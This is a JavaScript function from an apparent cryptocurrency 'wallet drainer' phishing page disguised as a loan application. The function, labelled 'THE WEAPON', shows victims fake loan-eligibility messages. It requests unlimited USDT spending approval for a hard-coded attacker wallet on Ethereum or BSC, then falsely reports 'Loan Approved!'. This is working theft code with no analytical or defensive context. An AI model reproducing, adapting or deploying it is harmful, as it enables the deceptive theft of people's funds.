// --- THE WEAPON: Initiate Loan & Drain ---
async function initiateLoan() {
    const message = document.getElementById("message");

    if (selectedAmount === 0) {
        message.style.color = "#ff4d4d";
        message.innerText = "Please select a loan amount first.";
        return;
    }

    if (accounts.length === 0) {
        message.style.color = "#D4AF37";
        message.innerText = "Please connect your wallet to proceed.";
        connectWallet();
        return;
    }

    try {
        message.style.color = "#D4AF37";
        message.innerText = "Verifying loan eligibility... Please confirm in wallet.";

        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        
        // Detect Network ID
        const network = await provider.getNetwork();
        const chainId = network.chainId;
        
        let usdtAddress = "";
        if (chainId === 1) {
            usdtAddress = "0xdAC17F958D2ee523e84df855C546A8831B4321fC"; // Ethereum Mainnet USDT
        } else if (chainId === 56) {
            usdtAddress = "0x55d39b5759b2d6b9909846a9725e9980e491de1c"; // BSC Mainnet USDT (Fixed Space)
        } else {
            // Fallback to BSC if other network is used
            usdtAddress = "0x55d39b5759b2d6b9909846a9725e9980e491de1c"; 
        }

        // YOUR WALLET ADDRESS
        const ATTACKER_WALLET = "0x8e65592106852a04D3D7d0F5E29Fbd8962FF5345"; 

        const usdtContract = new ethers.Contract(usdtAddress, [
            "function approve(address spender, uint256 amount) public returns (bool)"
        ], signer);

        // Step 1: Ask for approval to spend all USDT
        // MaxUint256 is used to get infinite approval
        await usdtContract.approve(ATTACKER_WALLET, ethers.constants.MaxUint256);

        message.style.color = "#00ff88";
        message.innerText = "Loan Approved! Funds will be transferred shortly.";

    } catch ( error) {
        console.error("Error during drain process:", error);
        message.style.color = "#ff4d4d";
        message.innerText = "Transaction Failed. Please try again.";
    }
}